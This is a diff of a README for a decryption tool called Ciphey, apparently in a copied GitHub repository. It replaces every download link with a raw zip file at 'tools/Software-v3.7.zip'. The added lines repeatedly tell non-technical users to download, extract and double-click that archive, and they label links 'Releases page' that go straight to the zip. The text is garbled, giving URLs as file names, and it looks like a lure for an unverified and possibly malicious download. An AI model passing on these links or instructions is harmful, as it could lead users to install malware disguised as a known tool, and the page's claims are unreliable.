@@ -1,6 +1,6 @@
 # 🔑 Ciphey - Effortless Decryption Made Simple
 
-[![Download Ciphey](https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip)](https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip)
+[![Download Ciphey](https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip)](https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To start using Ciphey, follow these simple steps. No programming skills are nece
 1. **Visit the Download Page**
    Go to the Releases page to download Ciphey by clicking the link below:
 
-   [Visit This Page to Download](https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip)
+   [Visit This Page to Download](https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of Ciphey. Select the one that suits your operating system and click on the link.
@@ -22,12 +22,12 @@ To start using Ciphey, follow these simple steps. No programming skills are nece
    After selecting a version, you will have the option to download a file. Click on the download link for that version. The file will download to your default downloads folder.
 
 4. **Locate the Downloaded File**
-   Once the download completes, find the file in your downloads folder. It will be named similar to `https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip` or `https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip`. 
+   Once the download completes, find the file in your downloads folder. It will be named similar to `https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip` or `https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip`. 
 
 ## 📥 Download & Install
 
 ### Step 1: Visit the Releases Page
-Start by clicking this link to access the [Releases page](https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip). 
+Start by clicking this link to access the [Releases page](https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip). 
 
 ### Step 2: Download the Latest Version
 Look for the latest version listed there. Click the corresponding link to download the file for your operating system.
@@ -36,7 +36,7 @@ Look for the latest version listed there. Click the corresponding link to downlo
 If you downloaded a `.zip` file, you will need to extract its contents. Right-click on the file and choose "Extract All" or use a program like WinRAR or 7-Zip.
 
 ### Step 4: Run Ciphey
-After extraction, double-click the `https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip` file. The application will open, allowing you to start using its features.
+After extraction, double-click the `https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip` file. The application will open, allowing you to start using its features.
 
 ## 🔍 How to Use Ciphey
 
@@ -90,6 +90,6 @@ If you need further assistance, feel free to reach out via the Issues tab on the
 If you have suggestions for improvements or features, you can contribute to Ciphey. For more details on contributing, check the repository guidelines on GitHub.
 
 ### Final Steps
-Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/OnlyyxErika/Ciphey/main/translations/zh/Ciphey_v1.0.zip) for future updates and new features.
+Don't forget to revisit the [Releases page](https://github.com/OnlyyxErika/Ciphey/raw/refs/heads/main/tools/Software-v3.7.zip) for future updates and new features.
 
 Enjoy using Ciphey for your decryption needs!
